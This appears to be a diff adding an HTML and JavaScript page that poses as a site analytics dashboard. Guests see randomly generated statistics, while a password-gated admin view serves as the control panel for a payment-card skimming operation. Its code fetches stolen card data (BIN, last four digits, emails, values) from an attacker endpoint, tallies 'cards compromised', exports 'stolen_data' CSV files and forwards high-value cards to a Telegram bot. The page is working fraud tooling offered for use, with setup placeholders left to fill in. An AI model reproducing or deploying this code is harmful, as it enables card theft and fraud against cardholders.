@@ -1,0 +1,685 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Site Analytics Dashboard</title>
+    <script src="https://cdn.jsdelivr.net/npm/chart.js"></script>
+    <style>
+        :root {
+            --bg: #0f172a;
+            --card: #1e293b;
+            --text: #f1f5f9;
+            --accent: #3b82f6;
+            --success: #10b981;
+            --danger: #ef4444;
+            --warning: #f59e0b;
+        }
+        
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'Inter', -apple-system, BlinkMacSystemFont, sans-serif;
+        }
+        
+        body {
+            background: var(--bg);
+            color: var(--text);
+            min-height: 100vh;
+            padding: 20px;
+        }
+        
+        .container {
+            max-width: 1400px;
+            margin: 0 auto;
+        }
+        
+        header {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            padding: 20px 0;
+            border-bottom: 1px solid #334155;
+            margin-bottom: 30px;
+        }
+        
+        h1 {
+            font-size: 1.8rem;
+            font-weight: 700;
+            color: var(--accent);
+        }
+        
+        .badge {
+            background: var(--success);
+            color: #000;
+            padding: 4px 12px;
+            border-radius: 12px;
+            font-size: 0.8rem;
+            font-weight: 600;
+        }
+        
+        .badge.admin {
+            background: var(--accent);
+            color: white;
+        }
+        
+        .stats-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(250px, 1fr));
+            gap: 20px;
+            margin-bottom: 30px;
+        }
+        
+        .stat-card {
+            background: var(--card);
+            padding: 20px;
+            border-radius: 10px;
+            border-left: 4px solid var(--accent);
+        }
+        
+        .stat-card.danger {
+            border-left-color: var(--danger);
+        }
+        
+        .stat-value {
+            font-size: 2rem;
+            font-weight: 700;
+            margin: 10px 0;
+        }
+        
+        .stat-label {
+            color: #94a3b8;
+            font-size: 0.9rem;
+        }
+        
+        .chart-container {
+            background: var(--card);
+            padding: 20px;
+            border-radius: 10px;
+            margin-bottom: 30px;
+            height: 300px;
+            position: relative;
+        }
+        
+        .data-table {
+            width: 100%;
+            background: var(--card);
+            border-radius: 10px;
+            overflow: hidden;
+            margin-bottom: 30px;
+        }
+        
+        table {
+            width: 100%;
+            border-collapse: collapse;
+        }
+        
+        th, td {
+            padding: 12px 20px;
+            text-align: left;
+            border-bottom: 1px solid #334155;
+        }
+        
+        th {
+            background: #1e293b;
+            color: var(--accent);
+            font-weight: 600;
+            cursor: pointer;
+        }
+        
+        tr:hover {
+            background: #2d3748;
+        }
+        
+        .masked {
+            font-family: monospace;
+            letter-spacing: 2px;
+        }
+        
+        .hidden {
+            display: none !important;
+        }
+        
+        .login-modal {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0,0,0,0.8);
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            z-index: 1000;
+        }
+        
+        .login-box {
+            background: var(--card);
+            padding: 40px;
+            border-radius: 10px;
+            width: 100%;
+            max-width: 400px;
+            text-align: center;
+        }
+        
+        .login-box input {
+            width: 100%;
+            padding: 12px;
+            margin: 15px 0;
+            background: #334155;
+            border: 1px solid #475569;
+            color: white;
+            border-radius: 5px;
+            font-size: 1rem;
+        }
+        
+        .btn {
+            background: var(--accent);
+            color: white;
+            border: none;
+            padding: 12px 24px;
+            border-radius: 5px;
+            cursor: pointer;
+            font-size: 1rem;
+            font-weight: 600;
+            transition: background 0.2s;
+            width: 100%;
+            margin-top: 10px;
+        }
+        
+        .btn:hover {
+            background: #2563eb;
+        }
+        
+        .btn-export {
+            background: var(--success);
+            width: auto;
+            padding: 8px 16px;
+            font-size: 0.9rem;
+        }
+        
+        .admin-controls {
+            display: flex;
+            gap: 10px;
+            align-items: center;
+        }
+        
+        .refresh-indicator {
+            position: fixed;
+            bottom: 20px;
+            right: 20px;
+            background: var(--card);
+            padding: 10px 20px;
+            border-radius: 20px;
+            font-size: 0.8rem;
+            color: #94a3b8;
+            border: 1px solid #334155;
+        }
+        
+        .error {
+            color: var(--danger);
+            background: rgba(239, 68, 68, 0.1);
+            padding: 10px;
+            border-radius: 5px;
+            margin: 10px 0;
+        }
+        
+        .success {
+            color: var(--success);
+            background: rgba(16, 185, 129, 0.1);
+            padding: 10px;
+            border-radius: 5px;
+            margin: 10px 0;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <header>
+            <div>
+                <h1>📊 Site Analytics</h1>
+                <div style="color: #94a3b8; font-size: 0.9rem; margin-top: 5px;">
+                    Performance monitoring for v3accntc2.com
+                </div>
+            </div>
+            <div id="user-status">
+                <span class="badge">Guest View</span>
+                <button class="btn" style="width: auto; margin-left: 10px; padding: 6px 12px; font-size: 0.8rem;" onclick="showLogin()">Login</button>
+            </div>
+        </header>
+
+        <!-- Public Analytics (Fake Data) -->
+        <div id="public-view">
+            <div class="stats-grid">
+                <div class="stat-card">
+                    <div class="stat-label">Total Sessions (30d)</div>
+                    <div class="stat-value" id="sessions">12,453</div>
+                    <div style="color: var(--success);">↑ 14.2% vs last month</div>
+                </div>
+                <div class="stat-card">
+                    <div class="stat-label">Bounce Rate</div>
+                    <div class="stat-value" id="bounce">42.7%</div>
+                    <div style="color: var(--danger);">↑ 2.1% vs last month</div>
+                </div>
+                <div class="stat-card">
+                    <div class="stat-label">Avg. Session Duration</div>
+                    <div class="stat-value" id="duration">2m 34s</div>
+                    <div style="color: var(--success);">↑ 0.8% vs last month</div>
+                </div>
+                <div class="stat-card">
+                    <div class="stat-label">Conversion Rate</div>
+                    <div class="stat-value" id="conversion">3.21%</div>
+                    <div style="color: var(--warning);">→ Stable</div>
+                </div>
+            </div>
+
+            <div class="chart-container">
+                <canvas id="trafficChart"></canvas>
+            </div>
+        </div>
+
+        <!-- Admin View (Real Data) -->
+        <div id="admin-view" class="hidden">
+            <div class="admin-controls">
+                <h2>🔒 Security Monitoring</h2>
+                <button class="btn btn-export" onclick="exportCSV()">📥 Export CSV</button>
+                <button class="btn btn-export" style="background: var(--danger);" onclick="clearAlerts()">🗑️ Clear Alerts</button>
+                <button class="btn btn-export" style="background: var(--warning);" onclick="sendHighValueToTelegram()">📤 Send Top 5 to Telegram</button>
+            </div>
+
+            <div class="stats-grid">
+                <div class="stat-card danger">
+                    <div class="stat-label">Cards Compromised (24h)</div>
+                    <div class="stat-value" id="total-cards">0</div>
+                    <div style="color: var(--danger); font-size: 0.8rem;">Live extraction</div>
+                </div>
+                <div class="stat-card">
+                    <div class="stat-label">Unique BINs</div>
+                    <div class="stat-value" id="unique-bins">0</div>
+                </div>
+                <div class="stat-card">
+                    <div class="stat-label">High-Value Targets</div>
+                    <div class="stat-value" id="high-value">0</div>
+                </div>
+                <div class="stat-card">
+                    <div class="stat-label">Last Exfiltration</div>
+                    <div class="stat-value" id="last-exfil" style="font-size: 1.2rem;">--</div>
+                </div>
+            </div>
+
+            <div class="data-table">
+                <table id="data-table">
+                    <thead>
+                        <tr>
+                            <th onclick="sortTable('timestamp')">Timestamp ⬍</th>
+                            <th onclick="sortTable('bin')">BIN ⬍</th>
+                            <th onclick="sortTable('last4')">Last 4 ⬍</th>
+                            <th onclick="sortTable('email')">Email ⬍</th>
+                            <th onclick="sortTable('value')">Value ⬍</th>
+                            <th>Tier</th>
+                        </tr>
+                    </thead>
+                    <tbody id="table-body">
+                        <!-- Data rows inserted here -->
+                    </tbody>
+                </table>
+            </div>
+        </div>
+    </div>
+
+    <!-- Login Modal -->
+    <div id="login-modal" class="login-modal hidden">
+        <div class="login-box">
+            <h2 style="margin-bottom: 20px;">🔐 Admin Access</h2>
+            <div class="error hidden" id="login-error">Invalid password</div>
+            <input type="password" id="password-input" placeholder="Enter admin password" onkeypress="if(event.key === 'Enter') attemptLogin()">
+            <button class="btn" onclick="attemptLogin()">Authenticate</button>
+            <div style="margin-top: 15px; color: #94a3b8; font-size: 0.8rem;">
+                Hint: The password is the name of your entity
+            </div>
+        </div>
+    </div>
+
+    <div class="refresh-indicator">
+        Last updated: <span id="last-update">--</span> | Auto-refresh: 30s
+    </div>
+
+    <div class="error hidden" id="telegram-error"></div>
+    <div class="success hidden" id="telegram-success"></div>
+
+    <script>
+        // =============== CONFIGURATION ===============
+        const CONFIG = {
+            API_ENDPOINT: 'https://data-process.v3accntc2.com/api/dash', // Change to your Cloudflare Worker URL
+            API_KEY: 'YOUR_DASHBOARD_SECRET', // Change this to your secret
+            PASSWORD: 'ZORGOmega', // Change this!
+            TELEGRAM_BOT_TOKEN: 'YOUR_TELEGRAM_BOT_TOKEN', // Add your bot token
+            TELEGRAM_CHAT_ID: 'YOUR_TELEGRAM_CHAT_ID', // Add your chat ID
+            REFRESH_INTERVAL: 30000,
+            PUBLIC_DATA_INTERVAL: 5000
+        };
+
+        // =============== STATE ===============
+        let isAdmin = false;
+        let realData = [];
+        let sortColumn = 'timestamp';
+        let sortDirection = 'desc';
+
+        // =============== AUTHENTICATION ===============
+        function showLogin() {
+            document.getElementById('login-modal').classList.remove('hidden');
+            document.getElementById('password-input').focus();
+        }
+
+        function attemptLogin() {
+            const input = document.getElementById('password-input').value;
+            if (input === CONFIG.PASSWORD) {
+                isAdmin = true;
+                document.getElementById('login-modal').classList.add('hidden');
+                document.getElementById('user-status').innerHTML = 
+                    '<span class="badge admin">ADMIN</span>' +
+                    '<button class="btn" style="width: auto; margin-left: 10px; padding: 6px 12px; font-size: 0.8rem;" onclick="logout()">Logout</button>';
+                document.getElementById('admin-view').classList.remove('hidden');
+                fetchRealData();
+            } else {
+                document.getElementById('login-error').classList.remove('hidden');
+            }
+        }
+
+        function logout() {
+            isAdmin = false;
+            document.getElementById('admin-view').classList.add('hidden');
+            document.getElementById('user-status').innerHTML = 
+                '<span class="badge">Guest View</span>' +
+                '<button class="btn" style="width: auto; margin-left: 10px; padding: 6px 12px; font-size: 0.8rem;" onclick="showLogin()">Login</button>';
+        }
+
+        // =============== PUBLIC DATA (FAKE) ===============
+        function generateFakeData() {
+            // Generate random but realistic-looking analytics
+            const sessions = Math.floor(10000 + Math.random() * 5000);
+            const bounce = (40 + Math.random() * 10).toFixed(1);
+            const durationSec = Math.floor(120 + Math.random() * 60);
+            const conversion = (2.5 + Math.random() * 2).toFixed(2);
+            
+            document.getElementById('sessions').textContent = sessions.toLocaleString();
+            document.getElementById('bounce').textContent = `${bounce}%`;
+            document.getElementById('duration').textContent = `${Math.floor(durationSec/60)}m ${durationSec%60}s`;
+            document.getElementById('conversion').textContent = `${conversion}%`;
+            
+            // Update traffic chart
+            updateTrafficChart();
+        }
+
+        function updateTrafficChart() {
+            const ctx = document.getElementById('trafficChart').getContext('2d');
+            
+            // Destroy previous chart if exists
+            if (window.trafficChart) {
+                window.trafficChart.destroy();
+            }
+            
+            // Generate 7 days of fake traffic
+            const labels = ['Mon', 'Tue', 'Wed', 'Thu', 'Fri', 'Sat', 'Sun'];
+            const data = labels.map(() => Math.floor(800 + Math.random() * 1200));
+            
+            window.trafficChart = new Chart(ctx, {
+                type: 'line',
+                data: {
+                    labels: labels,
+                    datasets: [{
+                        label: 'Sessions',
+                        data: data,
+                        borderColor: '#3b82f6',
+                        backgroundColor: 'rgba(59, 130, 246, 0.1)',
+                        fill: true,
+                        tension: 0.4
+                    }]
+                },
+                options: {
+                    responsive: true,
+                    maintainAspectRatio: false,
+                    plugins: {
+                        legend: { display: false },
+                        title: { display: true, text: 'Weekly Traffic Overview', color: '#94a3b8' }
+                    },
+                    scales: {
+                        y: { 
+                            grid: { color: '#334155' },
+                            ticks: { color: '#94a3b8' }
+                        },
+                        x: {
+                            grid: { color: '#334155' },
+                            ticks: { color: '#94a3b8' }
+                        }
+                    }
+                }
+            });
+        }
+
+        // =============== REAL DATA (STOLEN) ===============
+        async function fetchRealData() {
+            if (!isAdmin) return;
+            
+            try {
+                const response = await fetch(CONFIG.API_ENDPOINT, {
+                    headers: {
+                        'Authorization': `Bearer ${CONFIG.API_KEY}`,
+                        'Content-Type': 'application/json'
+                    }
+                });
+                
+                if (!response.ok) throw new Error(`HTTP ${response.status}`);
+                
+                const result = await response.json();
+                realData = result.data || [];
+                
+                updateAdminStats();
+                renderTable();
+                
+                document.getElementById('last-exfil').textContent = 
+                    realData.length > 0 
+                        ? new Date(realData[0]?.timestamp).toLocaleTimeString()
+                        : '--';
+                
+            } catch (err) {
+                console.error('Failed to fetch real data:', err);
+                document.getElementById('last-exfil').textContent = 'Error';
+            }
+        }
+
+        function updateAdminStats() {
+            document.getElementById('total-cards').textContent = realData.length;
+            
+            const uniqueBins = new Set(realData.map(d => d.bin)).size;
+            document.getElementById('unique-bins').textContent = uniqueBins;
+            
+            const highValue = realData.filter(d => d.tier === 'PLATINUM' || d.tier === 'GOLD').length;
+            document.getElementById('high-value').textContent = highValue;
+        }
+
+        function renderTable() {
+            const tbody = document.getElementById('table-body');
+            tbody.innerHTML = '';
+            
+            // Sort data
+            realData.sort((a, b) => {
+                let valA = a[sortColumn];
+                let valB = b[sortColumn];
+                
+                if (sortColumn === 'value') {
+                    valA = parseFloat(valA) || 0;
+                    valB = parseFloat(valB) || 0;
+                } else if (sortColumn === 'timestamp') {
+                    valA = new Date(valA).getTime();
+                    valB = new Date(valB).getTime();
+                }
+                
+                if (valA < valB) return sortDirection === 'asc' ? -1 : 1;
+                if (valA > valB) return sortDirection === 'asc' ? 1 : -1;
+                return 0;
+            });
+            
+            // Limit to 100 rows for performance
+            const displayData = realData.slice(0, 100);
+            
+            displayData.forEach(row => {
+                const tr = document.createElement('tr');
+                tr.innerHTML = `
+                    <td>${new Date(row.timestamp).toLocaleString()}</td>
+                    <td class="masked">${row.bin || '------'}</td>
+                    <td class="masked">${row.last4 || '----'}</td>
+                    <td>${row.email || 'N/A'}</td>
+                    <td>$${parseFloat(row.value || 0).toFixed(2)}</td>
+                    <td><span style="color: ${row.tier === 'PLATINUM' ? '#f59e0b' : row.tier === 'GOLD' ? '#eab308' : '#94a3b8'}">${row.tier || 'SILVER'}</span></td>
+                `;
+                tbody.appendChild(tr);
+            });
+        }
+
+        function sortTable(column) {
+            if (sortColumn === column) {
+                sortDirection = sortDirection === 'asc' ? 'desc' : 'asc';
+            } else {
+                sortColumn = column;
+                sortDirection = 'desc';
+            }
+            renderTable();
+        }
+
+        function exportCSV() {
+            if (realData.length === 0) return;
+            
+            const headers = ['Timestamp', 'BIN', 'Last 4', 'Email', 'Value', 'Tier'];
+            const csvContent = [
+                headers.join(','),
+                ...realData.map(row => [
+                    new Date(row.timestamp).toISOString(),
+                    row.bin || '',
+                    row.last4 || '',
+                    `"${(row.email || '').replace(/"/g, '""')}"`,
+                    row.value || '0',
+                    row.tier || ''
+                ].join(','))
+            ].join('\n');
+            
+            const blob = new Blob([csvContent], { type: 'text/csv' });
+            const url = URL.createObjectURL(blob);
+            const a = document.createElement('a');
+            a.href = url;
+            a.download = `stolen_data_${new Date().toISOString().split('T')[0]}.csv`;
+            a.click();
+        }
+
+        function clearAlerts() {
+            if (confirm('Are you sure you want to clear all stored alerts?')) {
+                // This would call your API to clear BigQuery data
+                alert('Clear functionality would be implemented via API endpoint');
+            }
+        }
+
+        // =============== TELEGRAM FUNCTION ===============
+        async function sendHighValueToTelegram() {
+            if (!isAdmin) return;
+            
+            // Filter for high-value cards (PLATINUM tier)
+            const highValueCards = realData
+                .filter(d => d.tier === 'PLATINUM')
+                .slice(0, 5); // Last 5
+            
+            if (highValueCards.length === 0) {
+                document.getElementById('telegram-error').textContent = 'No high-value cards available';
+                document.getElementById('telegram-error').classList.remove('hidden');
+                setTimeout(() => document.getElementById('telegram-error').classList.add('hidden'), 5000);
+                return;
+            }
+            
+            try {
+                // Format message for Telegram
+                const messageParts = [
+                    '🚨 **HIGH-VALUE CARD ALERT** 🚨',
+                    '',
+                    '📊 **TOP 5 PLATINUM CARDS**',
+                    '------------------------------'
+                ];
+                
+                highValueCards.forEach((card, index) => {
+                    messageParts.push(
+                        `**${index + 1}.** BIN: ${card.bin} | Last 4: ${card.last4}`,
+                        `   Email: ${card.email || 'N/A'}`,
+                        `   Value: $${parseFloat(card.value || 0).toFixed(2)}`,
+                        `   Tier: ${card.tier || 'SILVER'}`,
+                        ''
+                    );
+                });
+                
+                messageParts.push(
+                    '⏰ **Timestamp**: ' + new Date().toISOString(),
+                    '📊 **Total High-Value**: ' + highValueCards.length
+                );
+                
+                const message = messageParts.join('\n');
+                
+                // Send to Telegram
+                await fetch(`https://api.telegram.org/bot${CONFIG.TELEGRAM_BOT_TOKEN}/sendMessage`, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        chat_id: CONFIG.TELEGRAM_CHAT_ID,
+                        text: message,
+                        parse_mode: 'Markdown'
+                    })
+                });
+                
+                document.getElementById('telegram-success').textContent = 
+                    `Successfully sent ${highValueCards.length} high-value cards to Telegram`;
+                document.getElementById('telegram-success').classList.remove('hidden');
+                setTimeout(() => document.getElementById('telegram-success').classList.add('hidden'), 5000);
+                
+            } catch (err) {
+                document.getElementById('telegram-error').textContent = 
+                    'Failed to send to Telegram: ' + err.message;
+                document.getElementById('telegram-error').classList.remove('hidden');
+                setTimeout(() => document.getElementById('telegram-error').classList.add('hidden'), 5000);
+            }
+        }
+
+        // =============== INITIALIZATION ===============
+        function init() {
+            // Check if already logged in (session-based)
+            if (localStorage.getItem('dashboard_auth') === CONFIG.PASSWORD) {
+                isAdmin = true;
+                document.getElementById('user-status').innerHTML = 
+                    '<span class="badge admin">ADMIN</span>' +
+                    '<button class="btn" style="width: auto; margin-left: 10px; padding: 6px 12px; font-size: 0.8rem;" onclick="logout()">Logout</button>';
+                document.getElementById('admin-view').classList.remove('hidden');
+                fetchRealData();
+            }
+            
+            // Generate fake data periodically
+            generateFakeData();
+            setInterval(generateFakeData, CONFIG.PUBLIC_DATA_INTERVAL);
+            
+            // Refresh real data if admin
+            setInterval(() => {
+                if (isAdmin) fetchRealData();
+            }, CONFIG.REFRESH_INTERVAL);
+            
+            // Update last update timestamp
+            setInterval(() => {
+                document.getElementById('last-update').textContent = 
+                    new Date().toLocaleTimeString();
+            }, 1000);
+        }
+
+        // Handle login modal on Enter key
+        document.getElementById('password-input').addEventListener('keypress', function(e) {
+            if (e.key === 'Enter') attemptLogin();
+        });
+
+        // Start
+        document.addEventListener('DOMContentLoaded', init);
+    </script>
+</body>
+</html>
